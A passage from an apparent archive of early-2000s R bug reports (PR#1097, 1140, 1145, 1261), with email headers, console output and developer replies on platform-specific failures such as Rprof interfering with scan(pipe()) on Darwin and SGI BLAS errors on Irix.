[1] 3
[1] 4
[1] 5
[1] 6
[1] 7
[1] 8
[1] 9

for(i in 1:10) { print(.Call("simpleCall")) }

[1] 10
[1] 11
[1] 12
[1] 13
[1] 14
[1] 15
[1] 16
[1] 17
[1] 18
[1] 19

> for(i in 1:10) { print(.Call("simpleCall")) }

[1] 20
[1] 21
[1] 22
[1] 23
[1] 24
[1] 25
[1] 26
[1] 27
[1] 28
[1] 29

Seems ok ?

-- 
Michele Alzetta

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1097 *
Subject: R 1.3.1 fails 'make check' on arm in the Bessel example
From: Dirk Eddelbuettel <edd@debian.org>
Date: Thu, 20 Sep 2001 23:54:19 -0500
--This platform turned out to have badly broken FPU behaviour. Given up, at 
--least for now .
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1097 <==
From postmaster@franz.stat.wisc.edu  Fri Sep 21 06:54:31 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA13162
	for <r-bugs@biostat.ku.dk>; Fri, 21 Sep 2001 06:54:30 +0200 (MET DST)
Received: from sonny.eddelbuettel.com (really [64.195.36.229]) by franz.stat.wisc.edu
	via smail with esmtp (ident mail using rfc1413)
	id <m15kIKZ-000JJ6C@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Thu, 20 Sep 2001 23:54:27 -0500 (CDT) 
Received: from edd by sonny.eddelbuettel.com with local (Exim 3.32 #1 (Debian))
	id 15kIKS-0005EK-00
	for <r-bugs@r-project.org>; Thu, 20 Sep 2001 23:54:20 -0500
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15274.51195.688109.743960@sonny.eddelbuettel.com>
Date: Thu, 20 Sep 2001 23:54:19 -0500
To: r-bugs@r-project.org
Subject: R 1.3.1 fails 'make check' on arm in the Bessel example
X-Mailer: VM 6.92 under 21.4 (patch 1) "Copyleft" XEmacs Lucid
From: Dirk Eddelbuettel <edd@debian.org>


Debian tries to build its packages on a variety of platforms.  The arm
platform compiled 0.90.1 (the last Debian release before the Debian package
required an Atlas library, something we no longer require) failed in 'make
check'. The log snippet follows; I traced this to the example(Bessel) code.
 
> matplot(nu, t(outer(xx,nu, besselI)), type = 'l', ylim = c(-50,200),
+         main = expression(paste("Bessel ",I[nu](x)," for fixed ", x,
+                                 ",  as ",f(nu))),
+         xlab = expression(nu))
Error in title(main = main, sub = sub, xlab = xlab, ylab = ylab, ...) :
        Metric information not yet available for this device
        In addition: Warning messages:
        1: Nonfinite axis limits [GScale(nan,nan,1, .); log=0]
        2: relative range of values = 9.0072e+15 * EPS, is small (axis 1).
        3: Nonfinite axis limits [GScale(-inf,inf,2, .); log=0]
        4: relative range of values = 9.0072e+15 * EPS, is small (axis 2).
        Execution halted

Casual inspection suggests that GScale(nan,nan,1, .) is probably
incorrect. Now, src/nmath/bessel* provide the Bessel functions but does this
reflect a potential libc bug in IEEE handling?

I have also asked on the debian-arm mailing list, but no result so far. I
have some access to an arm box and could compile small test cases if that
helped. 

Dirk 
 
--please do not edit the information below--
 
Version:
 platform = i386-pc-linux-gnu
 arch = i386
 os = linux-gnu
 system = i386, linux-gnu
 status =
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R
 
Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


-- 
Better to have an approximate answer to the right question 
than a precise answer to the wrong question. -- John Tukey

==> 1097.audit <==
Fri Sep 21 07:46:37 2001	ripley	moved from incoming to System-specific
Fri Jun 14 18:10:49 2002	pd	changed notes
Fri Jun 14 18:10:49 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1140 *
Subject: Possible bug, Rprof() and scan(pipe())
From: Don MacQueen <macq@llnl.gov>
Date: Tue, 23 Oct 2001 13:50:26 -0700
--MacOS X: Doesn't happen on Solaris or Linux
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1140 <==
From macq@llnl.gov  Tue Oct 23 22:51:03 2001
Received: from smtp-2.llnl.gov (smtp-2.llnl.gov [128.115.250.82])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA27064
	for <r-bugs@biostat.ku.dk>; Tue, 23 Oct 2001 22:51:02 +0200 (MET DST)
Received: from [128.115.153.6] (localhost [127.0.0.1])
	by smtp-2.llnl.gov (8.9.3/8.9.3/LLNL-gateway-1.0) with ESMTP id NAA16321
	for <r-bugs@biostat.ku.dk>; Tue, 23 Oct 2001 13:50:23 -0700 (PDT)
Mime-Version: 1.0
X-Sender: e556558@popgun.llnl.gov
Message-Id: <p05101015b7fb820c1d22@[128.115.153.6]>
Date: Tue, 23 Oct 2001 13:50:26 -0700
To: r-bugs@biostat.ku.dk
From: Don MacQueen <macq@llnl.gov>
Subject: Possible bug, Rprof() and scan(pipe())
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

This looks like a bug?
Unable to use scan(pipe()) while profiling.
I have no idea whether this version of R violates the
    "do not use `Rprof' in an executable built for profiling"
warning in ?Rprof.

Thanks
-Don

>  version
          _
platform powerpc-apple-darwin1.4
arch     powerpc
os       darwin1.4
system   powerpc, darwin1.4
status   Patched
major    1
minor    3.1
year     2001
month    10
day      15
language R
>
>  foo <- scan(pipe('ls -1 | head -3'),what='')
Read 3 items
>  foo
[1] "README"      "RMfiles.dat" "RMfiles.tmp"
>  Rprof()
>  foo <- scan(pipe('ls -1 | head -3'),what='')
Read 0 items
>  foo
character(0)
>  Rprof(NULL)
>  foo <- scan(pipe('ls -1 | head -3'),what='')
Read 3 items
>

note, profiling does appear to be functional:
>  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
>  system('R CMD Rprof Rprof.out')

Each sample represents 0.02 seconds.
Total run time: 0.1 seconds.

Total seconds: time spent in function and callees.
Self seconds: time spent in function alone.

    %       total       %       self
  total    seconds     self    seconds    name
100.00      0.10      0.00      0.00     "hist"
  60.00      0.06      0.00      0.00     "hist.default"
  40.00      0.04     40.00      0.04     "rnorm"
  40.00      0.04      0.00      0.00     "plot"
  40.00      0.04      0.00      0.00     "plot.histogram"
  20.00      0.02      0.00      0.00     "storage.mode<-"
  20.00      0.02     20.00      0.02     "X11"
  20.00      0.02      0.00      0.00     "paste"
  20.00      0.02      0.00      0.00     "rect"
  20.00      0.02      0.00      0.00     "plot.new"
  20.00      0.02     20.00      0.02     "seq.default"
  20.00      0.02      0.00      0.00     "seq"
  20.00      0.02     20.00      0.02     "par"

    %       self        %       total
  self     seconds    total    seconds    name
  40.00      0.04     40.00      0.04     "rnorm"
  20.00      0.02     20.00      0.02     "X11"
  20.00      0.02     20.00      0.02     "seq.default"
  20.00      0.02     20.00      0.02     "par"

-- 
--------------------------------------
Don MacQueen
Environmental Protection Department
Lawrence Livermore National Laboratory
Livermore, CA, USA
--------------------------------------

==> 1140.followup.1 <==
From ripley@stats.ox.ac.uk  Sun Nov  4 14:01:05 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA21765
	for <R-bugs@biostat.ku.dk>; Sun, 4 Nov 2001 14:01:05 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id NAA06732;
	Sun, 4 Nov 2001 13:01:00 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id fA4D0xv19084;
	Sun, 4 Nov 2001 13:00:59 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Sun, 4 Nov 2001 13:00:59 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <macq@llnl.gov>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Possible bug, Rprof() and scan(pipe()) (PR#1140)
In-Reply-To: <200110232051.WAA27074@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0111041258370.19068-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

This does not happen on Solaris or Linux, so must be related to the use of
signals on darwin.

It probably means Rprof should be avoided on that platform, but the
porter (Jan de Leeuw) needs to investigate.


On Tue, 23 Oct 2001 macq@llnl.gov wrote:

> This looks like a bug?
> Unable to use scan(pipe()) while profiling.
> I have no idea whether this version of R violates the
>     "do not use `Rprof' in an executable built for profiling"
> warning in ?Rprof.
>
> Thanks
> -Don
>
> >  version
>           _
> platform powerpc-apple-darwin1.4
> arch     powerpc
> os       darwin1.4
> system   powerpc, darwin1.4
> status   Patched
> major    1
> minor    3.1
> year     2001
> month    10
> day      15
> language R
> >
> >  foo <- scan(pipe('ls -1 | head -3'),what='')
> Read 3 items
> >  foo
> [1] "README"      "RMfiles.dat" "RMfiles.tmp"
> >  Rprof()
> >  foo <- scan(pipe('ls -1 | head -3'),what='')
> Read 0 items
> >  foo
> character(0)
> >  Rprof(NULL)
> >  foo <- scan(pipe('ls -1 | head -3'),what='')
> Read 3 items
> >
>
> note, profiling does appear to be functional:
> >  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
> >  system('R CMD Rprof Rprof.out')
>
> Each sample represents 0.02 seconds.
> Total run time: 0.1 seconds.
>
> Total seconds: time spent in function and callees.
> Self seconds: time spent in function alone.
>
>     %       total       %       self
>   total    seconds     self    seconds    name
> 100.00      0.10      0.00      0.00     "hist"
>   60.00      0.06      0.00      0.00     "hist.default"
>   40.00      0.04     40.00      0.04     "rnorm"
>   40.00      0.04      0.00      0.00     "plot"
>   40.00      0.04      0.00      0.00     "plot.histogram"
>   20.00      0.02      0.00      0.00     "storage.mode<-"
>   20.00      0.02     20.00      0.02     "X11"
>   20.00      0.02      0.00      0.00     "paste"
>   20.00      0.02      0.00      0.00     "rect"
>   20.00      0.02      0.00      0.00     "plot.new"
>   20.00      0.02     20.00      0.02     "seq.default"
>   20.00      0.02      0.00      0.00     "seq"
>   20.00      0.02     20.00      0.02     "par"
>
>     %       self        %       total
>   self     seconds    total    seconds    name
>   40.00      0.04     40.00      0.04     "rnorm"
>   20.00      0.02     20.00      0.02     "X11"
>   20.00      0.02     20.00      0.02     "seq.default"
>   20.00      0.02     20.00      0.02     "par"
>
> --
> --------------------------------------
> Don MacQueen
> Environmental Protection Department
> Lawrence Livermore National Laboratory
> Livermore, CA, USA
> --------------------------------------
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1140.followup.2 <==
From luke@nokomis.stat.umn.edu  Sun Nov  4 14:18:34 2001
Received: from nokomis.stat.umn.edu (root@nokomis.stat.umn.edu [134.84.86.39])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA21858
	for <R-bugs@biostat.ku.dk>; Sun, 4 Nov 2001 14:18:33 +0100 (MET)
Received: (from luke@localhost)
	by nokomis.stat.umn.edu (8.11.3/8.10.2/SuSE Linux 8.10.0-0.3) id fA4DIOU10120;
	Sun, 4 Nov 2001 07:18:24 -0600
Date: Sun, 4 Nov 2001 07:18:24 -0600
From: Luke Tierney <luke@nokomis.stat.umn.edu>
To: ripley@stats.ox.ac.uk
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Possible bug, Rprof() and scan(pipe()) (PR#1140)
Message-ID: <20011104071824.A10053@nokomis.stat.umn.edu>
References: <200111041301.OAA21775@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <200111041301.OAA21775@pubhealth.ku.dk>; from ripley@stats.ox.ac.uk on Sun, Nov 04, 2001 at 02:01:10PM +0100

This feels like a system call restarting issue.  Some OS's restart
system calls after signals, others do not. For those that don't, low
level reads need to check for EINTR and such.  Connections use high
level reads, which should be insulated by the stdio library.  Possibly
dawrin's gets this wrong.  If strace is available you might be able to
tell that way.

luke

On Sun, Nov 04, 2001 at 02:01:10PM +0100, ripley@stats.ox.ac.uk wrote:
> This does not happen on Solaris or Linux, so must be related to the use of
> signals on darwin.
> 
> It probably means Rprof should be avoided on that platform, but the
> porter (Jan de Leeuw) needs to investigate.
> 
> 
> On Tue, 23 Oct 2001 macq@llnl.gov wrote:
> 
> > This looks like a bug?
> > Unable to use scan(pipe()) while profiling.
> > I have no idea whether this version of R violates the
> >     "do not use `Rprof' in an executable built for profiling"
> > warning in ?Rprof.
> >
> > Thanks
> > -Don
> >
> > >  version
> >           _
> > platform powerpc-apple-darwin1.4
> > arch     powerpc
> > os       darwin1.4
> > system   powerpc, darwin1.4
> > status   Patched
> > major    1
> > minor    3.1
> > year     2001
> > month    10
> > day      15
> > language R
> > >
> > >  foo <- scan(pipe('ls -1 | head -3'),what='')
> > Read 3 items
> > >  foo
> > [1] "README"      "RMfiles.dat" "RMfiles.tmp"
> > >  Rprof()
> > >  foo <- scan(pipe('ls -1 | head -3'),what='')
> > Read 0 items
> > >  foo
> > character(0)
> > >  Rprof(NULL)
> > >  foo <- scan(pipe('ls -1 | head -3'),what='')
> > Read 3 items
> > >
> >
> > note, profiling does appear to be functional:
> > >  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
> > >  system('R CMD Rprof Rprof.out')
> >
> > Each sample represents 0.02 seconds.
> > Total run time: 0.1 seconds.
> >
> > Total seconds: time spent in function and callees.
> > Self seconds: time spent in function alone.
> >
> >     %       total       %       self
> >   total    seconds     self    seconds    name
> > 100.00      0.10      0.00      0.00     "hist"
> >   60.00      0.06      0.00      0.00     "hist.default"
> >   40.00      0.04     40.00      0.04     "rnorm"
> >   40.00      0.04      0.00      0.00     "plot"
> >   40.00      0.04      0.00      0.00     "plot.histogram"
> >   20.00      0.02      0.00      0.00     "storage.mode<-"
> >   20.00      0.02     20.00      0.02     "X11"
> >   20.00      0.02      0.00      0.00     "paste"
> >   20.00      0.02      0.00      0.00     "rect"
> >   20.00      0.02      0.00      0.00     "plot.new"
> >   20.00      0.02     20.00      0.02     "seq.default"
> >   20.00      0.02      0.00      0.00     "seq"
> >   20.00      0.02     20.00      0.02     "par"
> >
> >     %       self        %       total
> >   self     seconds    total    seconds    name
> >   40.00      0.04     40.00      0.04     "rnorm"
> >   20.00      0.02     20.00      0.02     "X11"
> >   20.00      0.02     20.00      0.02     "seq.default"
> >   20.00      0.02     20.00      0.02     "par"
> >
> > --
> > --------------------------------------
> > Don MacQueen
> > Environmental Protection Department
> > Lawrence Livermore National Laboratory
> > Livermore, CA, USA
> > --------------------------------------
> >
> > -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> > r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> > Send "info", "help", or "[un]subscribe"
> > (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> > _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
> >
> 
> -- 
> Brian D. Ripley,                  ripley@stats.ox.ac.uk
> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
> University of Oxford,             Tel:  +44 1865 272861 (self)
> 1 South Parks Road,                     +44 1865 272860 (secr)
> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
> 
> 
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._

-- 
Luke Tierney
University of Minnesota                      Phone:           612-625-7843
School of Statistics                         Fax:             612-624-8868
313 Ford Hall, 224 Church St. S.E.           email:      luke@stat.umn.edu
Minneapolis, MN 55455 USA                    WWW:  http://www.stat.umn.edu

==> 1140.followup.3 <==
From macq@llnl.gov  Mon Nov  5 18:47:53 2001
Received: from smtp-1.llnl.gov (smtp-1.llnl.gov [128.115.250.81])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA05624
	for <R-bugs@biostat.ku.dk>; Mon, 5 Nov 2001 18:47:52 +0100 (MET)
Received: from [128.115.153.6] (localhost [127.0.0.1])
	by smtp-1.llnl.gov (8.9.3/8.9.3/LLNL-gateway-1.0) with ESMTP id JAA05930;
	Mon, 5 Nov 2001 09:46:15 -0800 (PST)
Mime-Version: 1.0
X-Sender: e556558@popgun.llnl.gov
Message-Id: <p0510100bb80c7eff076c@[128.115.153.6]>
In-Reply-To: <Pine.LNX.4.31.0111041258370.19068-100000@gannet.stats>
References: <Pine.LNX.4.31.0111041258370.19068-100000@gannet.stats>
Date: Mon, 5 Nov 2001 09:46:10 -0800
To: Jan de Leeuw <deleeuw@stat.ucla.edu>
From: Don MacQueen <macq@llnl.gov>
Subject: Re: [Rd] Possible bug, Rprof() and scan(pipe()) (PR#1140)
Cc: Prof Brian Ripley <ripley@stats.ox.ac.uk>, <R-bugs@biostat.ku.dk>
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

Jan,
Here is information on the problem with Rprof() that I encountered, 
including Brian Ripley's assessment.
This is OS X 10.1 with the 10.1 developer tools installed.
-Don

At 1:00 PM +0000 11/4/01, Prof Brian Ripley wrote:
>This does not happen on Solaris or Linux, so must be related to the use of
>signals on darwin.
>
>It probably means Rprof should be avoided on that platform, but the
>porter (Jan de Leeuw) needs to investigate.
>
>
>On Tue, 23 Oct 2001 macq@llnl.gov wrote:
>
>>  This looks like a bug?
>>  Unable to use scan(pipe()) while profiling.
>>  I have no idea whether this version of R violates the
>>      "do not use `Rprof' in an executable built for profiling"
>>  warning in ?Rprof.
>>
>>  Thanks
>>  -Don
>>
>>  >  version
>>            _
>>  platform powerpc-apple-darwin1.4
>>  arch     powerpc
>>  os       darwin1.4
>>  system   powerpc, darwin1.4
>>  status   Patched
>>  major    1
>>  minor    3.1
>>  year     2001
>>  month    10
>>  day      15
>>  language R
>>  >
>  > >  foo <- scan(pipe('ls -1 | head -3'),what='')
>>  Read 3 items
>>  >  foo
>>  [1] "README"      "RMfiles.dat" "RMfiles.tmp"
>>  >  Rprof()
>>  >  foo <- scan(pipe('ls -1 | head -3'),what='')
>>  Read 0 items
>>  >  foo
>>  character(0)
>>  >  Rprof(NULL)
>  > >  foo <- scan(pipe('ls -1 | head -3'),what='')
>>  Read 3 items
>>  >
>>
>>  note, profiling does appear to be functional:
>>  >  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
>>  >  system('R CMD Rprof Rprof.out')
>  >
>>  Each sample represents 0.02 seconds.
>>  Total run time: 0.1 seconds.
>>
>>  Total seconds: time spent in function and callees.
>>  Self seconds: time spent in function alone.
>>
>>      %       total       %       self
>>    total    seconds     self    seconds    name
>>  100.00      0.10      0.00      0.00     "hist"
>>    60.00      0.06      0.00      0.00     "hist.default"
>>    40.00      0.04     40.00      0.04     "rnorm"
>>    40.00      0.04      0.00      0.00     "plot"
>>    40.00      0.04      0.00      0.00     "plot.histogram"
>>    20.00      0.02      0.00      0.00     "storage.mode<-"
>>    20.00      0.02     20.00      0.02     "X11"
>>    20.00      0.02      0.00      0.00     "paste"
>>    20.00      0.02      0.00      0.00     "rect"
>>    20.00      0.02      0.00      0.00     "plot.new"
>>    20.00      0.02     20.00      0.02     "seq.default"
>>    20.00      0.02      0.00      0.00     "seq"
>>    20.00      0.02     20.00      0.02     "par"
>>
>>      %       self        %       total
>>    self     seconds    total    seconds    name
>>    40.00      0.04     40.00      0.04     "rnorm"
>>    20.00      0.02     20.00      0.02     "X11"
>>    20.00      0.02     20.00      0.02     "seq.default"
>>    20.00      0.02     20.00      0.02     "par"
>>
>>  --
>>  --------------------------------------
>>  Don MacQueen
>>  Environmental Protection Department
>>  Lawrence Livermore National Laboratory
>>  Livermore, CA, USA
>>  --------------------------------------
>>
>> 
>>-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
>>  r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
>>  Send "info", "help", or "[un]subscribe"
>>  (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
>> 
>>_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>>
>
>--
>Brian D. Ripley,                  ripley@stats.ox.ac.uk
>Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
>University of Oxford,             Tel:  +44 1865 272861 (self)
>1 South Parks Road,                     +44 1865 272860 (secr)
>Oxford OX1 3TG, UK                Fax:  +44 1865 272595


-- 
--------------------------------------
Don MacQueen
Environmental Protection Department
Lawrence Livermore National Laboratory
Livermore, CA, USA
--------------------------------------

==> 1140.audit <==
Sun Nov  4 13:54:41 2001	ripley	changed notes
Sun Nov  4 13:54:41 2001	ripley	foobar
Sun Nov  4 13:54:41 2001	ripley	moved from incoming to System-specific
Sun Apr 21 09:39:49 2002	ripley	changed notes
Sun Apr 21 09:39:49 2002	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1145 *
Subject: Problem testing R version 1.3.1 on SGI Irix
From: Gordon Lack <gml4410@ggr.co.uk>
Date: Fri, 26 Oct 2001 19:04:04 +0100
--error from using SGI libblas (not reported on other systems?)
--use --without-blas
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1145 <==
From postmaster@franz.stat.wisc.edu  Fri Oct 26 20:05:08 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA03262
	for <r-bugs@biostat.ku.dk>; Fri, 26 Oct 2001 20:05:07 +0200 (MET DST)
Received: from gate.ggr.co.uk (really [193.128.25.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15xBLs-000JIvC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 26 Oct 2001 13:05:04 -0500 (CDT) 
Received: (uucp@localhost) by gate.ggr.co.uk; Fri, 26 Oct 2001 19:06:07 +0100 (BST)
Received: from uk-stv-mhub1.ggr.co.uk(147.184.212.132) by gb-stv-fw2.ggr.co.uk via smap (V5.5)
	id xma019101; Fri, 26 Oct 01 19:05:11 +0100
Received: from ukwit01.ggr.co.uk (root@ukwit01.ggr.co.uk [147.184.219.175]) by mailhub.ggr.co.uk; Fri, 26 Oct 2001 19:04:07 +0100 (BST)
Received: from ggr.co.uk by ukwit01.ggr.co.uk (8.8.8/imd160294)
        id SAA126689; Fri, 26 Oct 2001 18:04:05 GMT
Sender: gml4410@ggr.co.uk
Message-ID: <3BD9A594.82824E30@ggr.co.uk>
Date: Fri, 26 Oct 2001 19:04:04 +0100
From: Gordon Lack <gml4410@ggr.co.uk>
Organization: Glaxo Wellcome
X-Mailer: Mozilla 4.78 [en] (X11; U; IRIX 6.5 IP32)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@r-project.org
Subject: Problem testing R version 1.3.1 on SGI Irix
References: <3BD9845D.6010512F@ggr.co.uk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

   I've compiled R verison 1.3.1 on SGI Irix 6.5

   It fails its check when running the ts-Ex.Rout test with:

=====
> 
> data(BJsales)
> ar(ts.union(BJsales, BJsales.lead))
Error in ar.yw.mts(x, aic = aic, order.max = order.max, na.action =
na.action,  : 
        On entry to DGEMM  parameter number 1 had an illegal value
Execution halted
=====

   It was compiled with gcc 2.95.2 (and the g77 which came with that,
which is 0.5.25).

==> 1145.followup.1 <==
From postmaster@franz.stat.wisc.edu  Thu Nov  1 18:30:36 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA02302
	for <r-bugs@biostat.ku.dk>; Thu, 1 Nov 2001 18:30:36 +0100 (MET)
Received: from gate.ggr.co.uk (really [193.128.25.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15zLfj-000JLMC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 1 Nov 2001 11:30:31 -0600 (CST) 
Received: (uucp@localhost) by gate.ggr.co.uk; Thu, 1 Nov 2001 17:31:24 GMT
Received: from uk-stv-mhub1.ggr.co.uk(147.184.212.132) by gb-stv-fw2.ggr.co.uk via smap (V5.5)
	id xma019221; Thu, 1 Nov 01 17:30:51 GMT
Received: from ukwit01.ggr.co.uk (root@ukwit01.ggr.co.uk [147.184.219.175]) by mailhub.ggr.co.uk; Thu, 1 Nov 2001 17:29:46 GMT
Received: from ggr.co.uk by ukwit01.ggr.co.uk (8.8.8/imd160294)
        id RAA163227; Thu, 1 Nov 2001 17:29:45 GMT
Sender: gml4410@ggr.co.uk
Message-ID: <3BE18689.D81206DA@ggr.co.uk>
Date: Thu, 01 Nov 2001 17:29:45 +0000
From: Gordon Lack <gml4410@ggr.co.uk>
Organization: Glaxo Wellcome
X-Mailer: Mozilla 4.78 [en] (X11; U; IRIX 6.5 IP32)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@r-project.org
Subject: Update on report PR#1145 (with a cross-reference to PR#1026).
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

   The original report was that compiling with gcc2.95.2 gcc and the
related g77 on Irix 6.,5.13 produced an R which wailed its tests with:

>> On entry to DGEMM  parameter number 1 had an illegal value

   To some extend this confused me, as the source only seems to mention
DGEMM in lowercase.  Eventually, after the debug code I added did
nothing, I realized that the R which was build was not using the
src/appl/blas.f source file: it was using the SGI libblas.

   My suspicion is that this is the cause.  The man page for this
mentions there is a C interface for dgemm but that it uses an enumerated
variable for the first 2 parameters in place of character strings.  I
thing things got mixed up somewhere along the line (perhaps with the
number of "_" appended to external symbils?).

   So, I tried configuring while adding "--without-blas" to the config  
options. This resulted in a SIGSEGV in the modreg test.  (See bug report
PR#1026, which also mentions this).

   So, a further try, this time using the compilers, cc anf f77 while  
still specifying "--without-blas" (so that the SGI libblas is ignored).

   This ran through the tests without crashing.  There were a few minor
differences in the print-tests output, but all at the "0 vs.  10**-300"
level, ie: floating point inaccuracies (which I presume are Ok and any
good statistician will ignore?).

==========
comparing `print-tests.Rout' to `./print-tests.Rout.save'
...259c259
< [1]  0.000000e+00 2.225074e-308 2.225074e-308 2.227299e-308
2.447581e-308
---
> [1] 2.002566e-308 2.222849e-308 2.225074e-308 2.225074e-308 2.225074e-308 2.2$
==========

   and 16 occurrences of:

==========
^H: syntax error
========== 
at the end.

==> 1145.audit <==
Wed Oct 31 11:35:29 2001	maechler	foobar
Wed Oct 31 11:35:29 2001	maechler	moved from incoming to System-specific
Tue Dec 11 13:22:24 2001	ripley	changed notes
Tue Dec 11 13:22:24 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1261 *
Subject: R_140 AND RHL_72 AND Packages
From: Patrick Gonin <gonin@genethon.fr>
Date: Wed, 15 Jan 2003 13:25:17 +0100
--Seems to relate to RH7.2 rpms
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1261 <==
From gonin@genethon.fr  Tue Jan 15 13:25:52 2002
Received: from sansgene.genethon.fr (root@sansgene.genethon.fr [193.50.68.15])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA28694
	for <r-bugs@biostat.ku.dk>; Tue, 15 Jan 2002 13:25:51 +0100 (MET)
Received: from [192.168.100.154] (nat0-154.genethon.fr [192.168.100.154])
	by sansgene.genethon.fr (8.11.5/8.11.5) with ESMTP id g0FCPKT28309
	for <r-bugs@biostat.ku.dk>; Tue, 15 Jan 2002 13:25:20 +0100 (MET)
Mime-Version: 1.0
X-Sender: gonin@sansgene.genethon.fr
Message-Id: <a05100300ba4b0138cb3c@[192.168.100.154]>
Date: Wed, 15 Jan 2003 13:25:17 +0100
To: r-bugs@biostat.ku.dk
From: Patrick Gonin <gonin@genethon.fr>
Subject: R_140 AND RHL_72 AND Packages
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

Dear colleagues,

>I use R under RH Linux 7.2 on a i686 PIII 733 machine.

I have a problem to install packages since R 1.4.0 has been installed.

>I have determined that whenever I install whichever package, the 
>installation (CMD INSTALL command) fail at finding R files, and at 
>finding all html,and other help files.
>However, it ends up with DONE INSTALL, and when you type 
>library(XXX) under R, there is no error. But it is like loading an 
>empty nutshell: no R function available, no help page available 
